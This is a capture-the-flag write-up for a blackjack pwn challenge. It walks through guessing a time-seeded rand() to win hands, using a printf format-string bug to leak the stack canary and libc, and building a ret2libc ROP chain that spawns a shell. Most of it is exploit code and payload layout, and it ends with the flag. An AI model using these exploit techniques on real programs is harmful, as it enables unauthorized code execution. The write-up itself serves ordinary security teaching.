# Jack Black Writeup

## Description

You just got invited to play a completely new game, different than everything ever created. They call it Jack Black, the creators were probably big Kung Fu Panda fans. Either way, you heard that the house always wins, but maybe your ropfu can even the score

## Solution Walkthrough

1. **Step 1**：

    First, look at the overall exploit flow:

    First, when the program reads the name, it can overflow into the return address:

    ```c
    #define NAME_BUF 64

    void game_loop(void) {
        char name[NAME_BUF];

        ...

        fgets(name, 256, stdin);
    }
    ```

    However, because there is a canary, we need to leak the canary first.

    Therefore, we can use the second vulnerability, printf, to leak the canary after winning the first time:

    ```c
    printf("Processing transaction for: ");
    printf(name);
    ```

    Here, we can directly provide a format string to leak the stack.

    But before achieving the method above, we need to make the program win every time so that we can reach the function we want to exploit.

    Since blackjack.c uses:

    ```c
    srand(time(NULL));
    ```

    We can write a script to guess the seed and let the player make the best decision. If it is really impossible to win, we just lose and move on to the next hand.

    After getting the leak, we need to win again for the second time and then exit the game to send the payload.

    This triggers the ROP chain, gives us a shell, and lets us obtain the flag.

2. **Step 2**：

    Write the seed-guessing part of the script.

    The program's card drawing logic is:

    ```c
    static int draw_card(void) {
        return (rand() % 13) + 1;
    }
    ```

    Therefore, as long as we know the output of rand(), we can know what cards will be drawn next.

    Since the seed is `time(NULL)`, the script can brute-force the seed around the current time:

    ```python
    now = int(time.time())
    window = int(args.WINDOW or 300)

    for seed in range(now - window, now + window + 1):
        seq = card_sequence(seed)

        if [pcard_name(seq[0]), pcard_name(seq[1]), pcard_name(seq[2])] == visible:
            log.info(f'seed = {seed}')
            return seed, seq, 0
    ```

    After finding the seed, we can generate the complete card sequence.

    The script then simulates the result of the player's hit/stand decisions and the dealer drawing cards:

    ```python
    def simulate_hand(seq, idx, hits):
        player = [seq[idx], seq[idx + 2]]
        dealer = [seq[idx + 1], seq[idx + 3]]

        ...
    ```

    Then it tries different numbers of hits and finds a choice that can win. If winning is impossible, it moves on to the next hand:

    ```python
    def choose_winning_action(seq, idx):
        for desired_hits in range(10):
            won, new_idx, actual_hits = simulate_hand(seq, idx, desired_hits)

            if won:
                return actual_hits, new_idx

        # if can't win then lose lol
        _, new_idx, actual_hits = simulate_hand(seq, idx, 0)

        return actual_hits, new_idx
    ```

    With this script, we can make sure the program wins whenever needed, allowing us to smoothly proceed to the next step and send the payload.

3. **Step 3**：

    After winning the first hand, the program enters:

    ```text
    Enter your name for the transaction record:
    ```

    The normal way to write this should be printf("%s", name), but the program uses printf(name), so name will be parsed as a format string.

    At this point, we use the format string vulnerability to leak the canary and a libc address. The script uses:

    ```python
    io.sendline(f'%41$p.%43$p'.encode())
    ```

    Which is:

    ```python
    io.sendline(f'%{FMT_CANARY}$p.%{FMT_LIBC_RET}$p'.encode())
    ```

    `%41$p` leaks the stack canary, and `%43$p` leaks a libc-related return address.

    After getting the libc leak, we can calculate the libc base:

    ```python
    libc.address = libc_leak - libc_ret
    ```

    After obtaining the libc base, we can find the addresses needed for the ROP chain:

    ```text
    system()
    exit()
    "/bin/sh"
    pop rdi ; ret
    ```

4. **Step 4**：

    After leaking the canary and libc, we need to win one more time and re-enter the name prompt.

    This time, we send the full overflow payload:

    ```python
    payload = flat(
        b'A' * 72,
        canary,
        b'A' * 8,
        ret,
        pop_rdi,
        bin_sh,
        libc.sym['system'],
        libc.sym['exit'],
    )
    ```

    From the start of the name buffer to the canary, we need to fill 72 bytes.

    Since there is a stack canary, the payload must place back the correct canary that we leaked earlier. Otherwise, when the function checks the canary before returning, the program will crash.

    The full payload structure is:

    ```text
    A * 72
    canary
    saved rbp
    ret
    pop rdi ; ret
    "/bin/sh"
    system
    exit
    ```

    The goal of the ROP chain is to execute:

    ```c
    system("/bin/sh");
    ```

    After sending the payload, the program is still inside `game_loop()` and asks:

    ```text
    Play another hand? [y/n]:
    ```

    At this point, enter n to make `game_loop()` finish and return.

    After the function returns, it uses the return address we overwrote and starts executing the ROP chain.

    After getting a shell, the script automatically sends:

    ```bash
    cat flag* 2>/dev/null || cat /home/*/flag* 2>/dev/null || /bin/sh
    ```

    Then we can get the flag.

## Flag

```text
dalctf{w3r3_y0u_c0unt1ng_c4rd5?}
```
